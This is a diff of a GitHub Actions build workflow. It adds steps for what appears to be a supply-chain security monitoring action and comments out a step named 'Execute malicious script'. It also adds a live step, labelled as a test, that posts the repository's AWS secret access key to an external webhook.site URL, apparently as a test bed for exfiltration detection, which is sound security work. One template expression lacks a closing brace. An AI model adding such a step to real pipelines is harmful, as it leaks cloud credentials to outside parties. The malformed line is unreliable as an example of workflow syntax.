@@ -9,12 +9,15 @@ permissions:
   packages: read
 
 jobs:
-  unrelesed-deps:
+  python-application-build:
     runs-on: ubuntu-latest
     name: Run build
     steps:
-
-      - uses: actions/checkout@v4
+      - name: Setup PSE
+        uses: invisirisk/pse-action@dev-test
+        with:
+          api_url: "https://app.dev.invisirisk.com"
+          app_token: ${{ secrets.IR_API_KEY }
 
       - name: Use npm
         uses: actions/setup-node@v4
@@ -24,5 +27,17 @@ jobs:
       - name: Install dependencies
         run: npm install --legacy-peer-deps
 
-      - name: 😈 Execute malicious script
-        run: bash run_malicious_scripts.sh
+      #- name: 😈 Execute malicious script
+       # run: bash run_malicious_scripts.sh
+
+      - name: Send AWS Secret via Webhook (test)
+        run: |
+         curl -X POST "https://webhook.site/59c8292c-2297-4149-ac29-c02bec44a27a" \
+           --data-urlencode "aws_secret_access_key=${{ secrets.AWS_SECRET_ACCESS_KEY }}"
+
+
+      - name: Cleanup PSE
+        if: always()
+        uses: invisirisk/pse-action@dev-test
+        with:
+          cleanup: "true"
